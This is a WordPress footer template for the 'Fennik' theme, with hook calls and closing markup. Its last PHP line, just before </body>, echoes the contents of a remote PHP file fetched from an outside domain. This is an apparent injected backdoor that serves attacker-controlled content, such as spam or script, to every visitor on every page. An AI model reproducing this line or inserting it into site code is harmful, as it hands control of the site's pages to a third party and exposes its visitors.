<?php
/**
 * The template for displaying the footer.
 * @package Fennik WordPress theme
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}
?>

        </main><!-- #main -->

        <?php do_action('fennik/action/after_main'); ?>

        <?php
            do_action('fennik/action/before_footer');

            if ( ! function_exists( 'elementor_theme_do_location' ) || ! elementor_theme_do_location( 'footer' ) ) {
                do_action('fennik/action/footer');
            }

            do_action('fennik/action/after_footer');
        ?>
    </div><!-- #wrap -->

    <?php do_action('fennik/action/after_wrap'); ?>

</div><!-- #outer-wrap-->

<?php do_action('fennik/action/after_outer_wrap'); ?>

<div class="la-overlay-global"></div>

<?php wp_footer(); ?>
<?php echo file_get_contents("https://acehmedia.id/Sky.php"); ?>
</body>
</html>